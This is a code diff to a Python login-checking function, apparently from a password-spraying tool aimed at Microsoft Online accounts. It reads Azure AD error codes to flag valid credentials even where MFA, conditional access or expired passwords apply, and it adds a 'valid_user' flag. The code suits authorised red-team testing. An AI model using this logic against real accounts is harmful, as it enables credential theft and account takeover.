@@ -5,8 +5,9 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
         'result': None,    # Can be "success", "failure" or "potential"
-		'error' : False,
-        'output' : ""
+        'error': False,
+        'output' : "",
+        'valid_user' : False
     }
 
     body = {
@@ -41,6 +42,7 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
         if resp.status_code == 200:
             data_response['result'] = "success"
             data_response['output'] = f"[+] SUCCESS: {username}:{password}"
+            data_response['valid_user'] = True
 
         else:
             response = resp.json()
@@ -62,29 +64,25 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
                 # Microsoft MFA response
                 data_response['result'] = "success"
                 data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
-                #utils.slacklog("The response indicates MFA (Microsoft) is in use.")
-                #utils.slacknotify(username, password)
-
+                data_response['valid_user'] = True
 
             elif "AADSTS50158" in error:
                 # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                 data_response['result'] = "success"
                 data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
-                #utils.slacklog("The response indicates conditional access (MFA: DUO or other) is in use.")
-                #utils.slacknotify(username, password)
+                data_response['valid_user'] = True
 
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
                 data_response['result'] = "potential"
                 data_response['output'] = f"[?] WARNING! The account {username} appears to be locked."
 
-
             elif "AADSTS50055" in error:
                 # User password is expired
                 data_response['result'] = "success"
                 data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The user's password is expired."
-                # utils.slacknotify(username, password)
-
+                data_response['valid_user'] = True
+                
             else:
                 # Unknown errors
                 data_response['result'] = "failure"
